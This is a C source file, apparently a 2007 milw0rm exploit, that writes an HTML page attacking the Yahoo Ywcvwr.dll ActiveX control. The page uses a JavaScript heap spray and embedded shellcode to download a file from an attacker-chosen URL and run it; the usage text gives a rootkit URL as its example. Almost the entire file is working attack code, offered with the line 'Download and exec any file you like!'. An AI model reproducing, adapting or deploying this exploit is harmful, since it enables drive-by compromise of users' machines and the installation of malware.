/* 
  Compile in LCC-win32 (Free!)
  Download and exec any file you like!
  Have Fun!
  */ 
   
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
char *file = "Click_here.html";
FILE *fp = NULL;
   
  unsigned char sc[] =
  "\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03"
"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74"
"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"
"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03"
"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C"
"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"
"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C"
"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC"
"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"
"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB"
"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83"
"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"
"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF";
   
  
char *url = NULL;
unsigned char sc_2[] = "\x00\x98";
  
char * header =
"<html>\n"
"<object classid=\"clsid:9D39223E-AE8E-11D4-8FD3-00D0B7730277\" id='viewme'></object>\n"
"<body>\n"
"<SCRIPT language=\"javascript\">\n"
"var shellcode = unescape(\"%u9090%u9090%u9090%u9090\" + \n";
  char * footer =
"\n\n"
"bigblock = unescape(\"%u9090%u9090\");\n"
"headersize = 20;\n"
"slackspace = headersize+shellcode.length;\n"
"while (bigblock.length<slackspace) bigblock+=bigblock;\n"
"fillblock = bigblock.substring(0, slackspace);\n"
"block = bigblock.substring(0, bigblock.length-slackspace);\n"
"while(block.length+slackspace<0x40000) block = block+block+fillblock;\n"
"memory = new Array();\n"
"for (x=0; x<500; x++) memory[x] = block + shellcode;\n"
"var buffer = '\\x0a';\n"
"while (buffer.length < 5000) buffer+='\\x0a\\x0a\\x0a\\x0a';\n"
"viewme.server = buffer;\n"
"viewme.receive();\n";
  
char * trigger_1 =
"</script>\n"
"</body>\n"
"</html>\n";
  
// print unicode shellcode
void PrintPayLoad(char *lpBuff, int buffsize)
{
int i;
for(i=0;i<buffsize;i+=2)
{
if((i%16)==0)
{
if(i!=0)
{
printf("\"\n\"");
fprintf(fp, "%s", "\" +\n\"");
}
else
{
printf("\"");
fprintf(fp, "%s", "\"");
}
}
  printf("%%u%0.4x",((unsigned short*)lpBuff)[i/2]);
  fprintf(fp, "%%u%0.4x",((unsigned short*)lpBuff)[i/2]);
}
  printf("\";\n");
fprintf(fp, "%s", "\");\n");
  
fflush(fp);
}
   
  
void main(int argc, char **argv)
{
unsigned char buf[1024] = {0};
  int sc_len = 0;
int n;
  
if (argc < 2)
{
 printf("\r\nYahoo 0day Ywcvwr.dll ActiveX Exploit #2 Download And Exec\n");
 printf("link:http://research.eeye.com/html/advisories/upcoming/20070605.html\n");
 printf("link:http://www.informationweek.com/news/showArticle.jhtml?articleID=199901856 \n");
 printf("link:http://secunia.com/advisories/25547/\n");
 printf("greetz to Jambalaya for helping with this code\n");
 printf("\r\nUsage: %s <URL> [htmlfile]\n", argv[0]);
 printf("\r\nE.g.: %s http://www.malwarehere.com/rootkit.exe exploit.html\r\n\n", argv[0]);
 printf("=-Excepti0n-=\n");
 exit(1);
}
  url = argv[1];
  
if( (!strstr(url, "http://") && !strstr(url, "ftp://")) || strlen(url) < 10)
{
printf("[-] Invalid url. Must start with 'http://','ftp://'\n");
return;
}
  printf("[+] download url:%s\n", url);
  if(argc >=3) file = argv[2];
printf("[+] exploit file:%s\n", file);
  fp = fopen(file, "w");
if(!fp)
{
printf("[-] Open file error!\n");
return;
}
  
//build Exploit HTML File
fprintf(fp, "%s", header);
fflush(fp);
  memset(buf, 0, sizeof(buf));
sc_len = sizeof(sc)-1;
memcpy(buf, sc, sc_len);
memcpy(buf+sc_len, url, strlen(url));
  sc_len += strlen(url);
  memcpy(buf+sc_len, sc_2, 1);
sc_len += 1;
  PrintPayLoad((char *)buf, sc_len);
  fprintf(fp, "%s", footer);
fflush(fp);
  fprintf(fp, "%s", trigger_1);
fflush(fp);
  
printf("[+] exploit write to %s success!\n", file);
}
  
// =-Excepti0n-= 

// milw0rm.com [2007-06-08]